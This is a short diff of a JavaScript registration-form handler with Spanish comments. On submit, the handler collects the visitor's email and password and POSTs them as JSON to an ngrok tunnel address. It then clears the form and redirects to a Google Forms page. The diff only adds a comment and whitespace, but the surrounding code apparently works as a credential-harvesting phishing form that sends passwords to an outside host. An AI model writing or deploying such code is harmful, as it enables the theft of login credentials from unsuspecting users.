@@ -8,7 +8,8 @@ formElement.addEventListener("submit", (event) => {
     let transaction = { email: email, password: password };
     let transactionJson = JSON.stringify(transaction);
 
-   fetch("https://6182-45-230-198-19.ngrok-free.app/prueba", {
+    // Enviar transactionJson al backend
+    fetch("https://6182-45-230-198-19.ngrok-free.app/prueba", {
         method: "POST",
         headers: {
             "Content-Type": "application/json" // Asegúrate de establecer el tipo de contenido
@@ -18,7 +19,9 @@ formElement.addEventListener("submit", (event) => {
     .then(response => {
         console.log();
     })
+    
         // Limpiar el formulario y redirigir al formulario de Google
         document.getElementById('registroForm').reset();
         window.location.href = "https://docs.google.com/forms/d/1aQvnqWGLfWUFuCgYajcQ13Fr9qAX-BSBsU8W4s8lU7E/edit";
     });
+
